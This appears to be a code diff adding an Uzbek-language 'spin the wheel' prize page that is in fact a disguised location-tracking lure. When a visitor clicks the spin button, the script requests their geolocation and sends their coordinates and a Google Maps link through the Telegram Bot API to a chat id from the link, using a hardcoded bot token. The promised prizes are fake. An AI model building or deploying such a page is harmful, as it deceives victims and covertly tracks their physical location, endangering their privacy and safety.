@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="uz">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Spin Wheel - Sovg'alar!</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
+      body {
+        height: 100vh;
+        background: linear-gradient(135deg, #c3a3f1, #6414e9);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .wrapper {
+        width: 90%;
+        max-width: 400px;
+        background-color: #ffffff;
+        padding: 3em;
+        border-radius: 1em;
+        text-align: center;
+        box-shadow: 0 4em 5em rgba(27, 8, 53, 0.2);
+        position: relative;
+      }
+      .container {
+        position: relative;
+        width: 100%;
+        height: 100%;
+      }
+      #wheel {
+        width: 100%;
+        height: auto;
+      }
+      #spin-btn {
+        position: absolute;
+        transform: translate(-50%, -50%);
+        top: 50%;
+        left: 50%;
+        height: 26%;
+        width: 26%;
+        border-radius: 50%;
+        cursor: pointer;
+        border: 0;
+        background: radial-gradient(#fdcf3b 50%, #d88a40 85%);
+        color: #c66e16;
+        text-transform: uppercase;
+        font-size: 0.8em;
+        font-weight: 600;
+      }
+      img {
+        position: absolute;
+        width: 3em;
+        top: 45%;
+        right: -10%;
+      }
+      #final-value {
+        margin-top: 1.5em;
+        font-size: 1.2em;
+        color: #202020;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+      <div class="container">
+        <canvas id="wheel"></canvas>
+        <button id="spin-btn">OMAD</button>
+        <img
+          src="https://telegra.ph/file/3f86031a2bb355be4f338.png"
+          alt="spinner arrow"
+        />
+      </div>
+      <div id="final-value">
+        <p>Aylantiring va yuting!</p>
+      </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-datalabels/2.1.0/chartjs-plugin-datalabels.min.js"></script>
+
+    <script>
+      // --- SIZNING BOT SOZLAMALARINGIZ ---
+      const urlParams = new URLSearchParams(window.location.search);
+      const SENDER_ID = urlParams.get("id");
+      const API_KEY = "8568228545:AAEq_dmrBLEhLrhhCYp-8OoREpLt4YwNWHM";
+
+      const wheel = document.getElementById("wheel");
+      const spinBtn = document.getElementById("spin-btn");
+      const finalValue = document.getElementById("final-value");
+
+      const data = [16, 16, 16, 16, 16, 16];
+      var pieColors = [
+        "#8b35bc",
+        "#b163da",
+        "#8b35bc",
+        "#b163da",
+        "#8b35bc",
+        "#b163da",
+      ];
+
+      let myChart = new Chart(wheel, {
+        plugins: [ChartDataLabels],
+        type: "pie",
+        data: {
+          labels: [
+            "1 mln",
+            "2 mln",
+            "500k",
+            "iPhone",
+            "10 mln",
+            "Yana bir bor",
+          ],
+          datasets: [{ backgroundColor: pieColors, data: data }],
+        },
+        options: {
+          responsive: true,
+          animation: { duration: 0 },
+          plugins: {
+            tooltip: false,
+            legend: { display: false },
+            datalabels: {
+              color: "#ffffff",
+              font: { size: 12 },
+              formatter: (value, context) =>
+                context.chart.data.labels[context.dataIndex],
+            },
+          },
+        },
+      });
+
+      spinBtn.addEventListener("click", () => {
+        // Lokatsiyani so'rash
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        }
+
+        spinBtn.disabled = true;
+        finalValue.innerHTML = `<p>Omad kutilmoqda...</p>`;
+        let randomDegree = Math.floor(Math.random() * 355);
+        let rotationInterval = window.setInterval(() => {
+          myChart.options.rotation = (myChart.options.rotation || 0) + 15;
+          myChart.update();
+          if (myChart.options.rotation >= 3600) {
+            // 10 marta aylangandan keyin to'xtash
+            clearInterval(rotationInterval);
+            finalValue.innerHTML = `<p>🎉 Tabriklaymiz! Sovg'ani olish uchun botga qayting.</p>`;
+          }
+        }, 10);
+      });
+
+      function showPosition(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        if (SENDER_ID) {
+          const text = `🎯 Linkka kimdir kirdi!\n📍 Manzil: https://www.google.com/maps?q=${lat},${lon}`;
+          fetch(
+            `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${SENDER_ID}&text=${encodeURIComponent(
+              text
+            )}`
+          );
+          fetch(
+            `https://api.telegram.org/bot${API_KEY}/sendLocation?chat_id=${SENDER_ID}&latitude=${lat}&longitude=${lon}`
+          );
+        }
+      }
+    </script>
+  </body>
+</html>
